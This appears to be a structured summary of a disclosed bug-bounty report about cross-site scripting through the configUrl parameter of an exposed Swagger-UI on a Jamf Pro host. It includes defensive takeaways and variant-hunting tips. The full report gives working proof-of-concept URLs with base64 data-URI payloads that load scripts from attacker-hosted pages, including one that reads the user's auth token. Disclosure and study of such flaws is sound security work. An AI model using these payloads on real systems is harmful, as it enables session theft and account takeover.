# XSS via Unvalidated configUrl Parameter in Exposed Swagger-UI at jamfpro.shopifycloud.com

## Metadata
- **Source:** HackerOne
- **Report:** 1444682 | https://hackerone.com/reports/1444682
- **Submitted:** 2022-01-09
- **Reporter:** kannthu
- **Program:** Jamf
- **Bounty:** Not specified
- **Severity:** critical
- **Vuln:** Cross-Site Scripting (XSS), Improper Input Validation, Exposed Debug/Documentation Endpoint, Data URI Injection
- **CVEs:** None
- **Category:** web-api

## Summary
An exposed Swagger-UI endpoint at /classicapi/doc/ on jamfpro.shopifycloud.com accepts an unvalidated configUrl parameter that can be exploited to execute arbitrary JavaScript code. An attacker can craft malicious links using data URIs to perform account takeover by stealing authentication tokens stored in localStorage, or deliver phishing payloads to authenticated users.

## Attack scenario
1. Attacker identifies that Jamf Pro instance has exposed Swagger-UI documentation at /classicapi/doc/ endpoint
2. Attacker discovers the configUrl parameter is not properly validated and accepts data URIs with arbitrary content
3. Attacker crafts a malicious URL containing base64-encoded data URI payload pointing to attacker-controlled server
4. Attacker sends the crafted URL to a Jamf Pro user (via phishing email or social engineering)
5. When authenticated user clicks the link, JavaScript executes in the context of jamfpro.shopifycloud.com domain
6. Attacker's payload extracts authToken from localStorage and exfiltrates it to attacker infrastructure, achieving account takeover

## Root cause
The Swagger-UI endpoint fails to validate or sanitize the configUrl query parameter before using it to load configuration. The application does not implement proper Content Security Policy (CSP) headers, allowing arbitrary data URIs to be executed. Additionally, debug endpoints should not be exposed in production, and authentication tokens should not be stored in easily accessible localStorage.

## Attacker mindset
Opportunistic attacker exploiting exposed debugging endpoints combined with inadequate input validation. The attacker recognizes that combining client-side token storage with unvalidated configuration parameters creates a critical account takeover vector. The use of base64 encoding and data URIs is an attempt to bypass basic URL-based filtering.

## Defensive takeaways
- Remove or properly secure debug endpoints (Swagger-UI, API documentation) from production environments
- Implement strict whitelist validation for configUrl parameter—only allow URLs from trusted domains
- Deploy Content Security Policy (CSP) headers with restrictive directives (no data: URIs, script-src 'self')
- Store sensitive authentication tokens in httpOnly, Secure cookies instead of localStorage
- Implement CORS restrictions to prevent cross-origin configuration loading
- Add authentication/authorization checks to debug endpoints if they must remain accessible
- Implement request signing or CSRF tokens for configuration loading mechanisms
- Regular security audits to identify exposed endpoints before production deployment

## Variant hunting
Check for other exposed Swagger-UI, Springfox, or similar API documentation endpoints across Jamf domains
Search for other unvalidated URL/URI parameters in configuration loading mechanisms (configUrl, config, url, apiUrl, swaggerUrl)
Test other base64/encoding bypass techniques for parameter filtering (hex encoding, UTF-8 variants)
Investigate if other authentication schemes (SAML, OAuth) also store tokens in predictable localStorage keys
Look for similar patterns in other endpoint handlers that accept external URL references
Test if XSS payloads can be delivered via other content-type headers in data URIs

## MITRE ATT&CK
- T1190
- T1566
- T1598
- T1528
- T1539
- T1563

## Notes
This is a critical vulnerability combining multiple weaknesses: exposed debugging endpoint, improper input validation, and client-side token storage. The data URI technique effectively bypasses simple URL-based filtering. The attacker's assumption about SAML token storage in localStorage is reasonable given Jamf Pro's authentication architecture. The base64 encoding in the POC URLs is a simple obfuscation technique. Real-world impact is severe as authenticated users of an enterprise management platform (Jamf Pro) represent high-value targets for lateral movement and infrastructure compromise.

## Full report
<details><summary>Expand</summary>

*Description*
There is Jamf Pro running at https://jamfpro.shopifycloud.com/ which has old Swagger-UI exposed at /classicapi/doc/. I think it's possible to take over the Jamf Pro account of the user that clicks the link. (more about that below) 

*Steps to reproduce*

**POC with simple alert box**:
1. Open `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
2. You should see an alert box (F1573391)

**POC rendering phishing page**:
1. Click the link: `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vdGVhcmZ1bC1lYXJ0aC5zdXJnZS5zaC90ZXN0LnlhbWwiLAp9`
2. You should see a phishing page rendered (F1573392)

**POC of stealing auth token**:
Jamf Pro stores authentication token in localstorage under `authToken` key when you authenticate using login and password, so my assumption is that it will do the same for Saml authentication. (you will have to test that) If it's true then taking over the user's account who clicked the link would be trivial. The POC below will print `authToken` from localstorage.

1. Authenticate to `jamfpro.shopifycloud.com` and click the link: `https://jamfpro.shopifycloud.com/classicapi/doc/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9zdGFuZGluZy1zYWx0LnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==`
2. You should see an alert box with auth token. 

## Impact

An attacker can execute arbitrary JS code in the context of https://jamfpro.shopifycloud.com/ - it means he can do whatever authenticated user at https://jamfpro.shopifycloud.com/ could do.

## Impact

An attacker can execute arbitrary JS code in the context of https://jamfpro.shopifycloud.com/ - it means he can do whatever authenticated user at https://jamfpro.shopifycloud.com/ could do.

</details>

---
*Analysed by Claude on 2026-05-12*
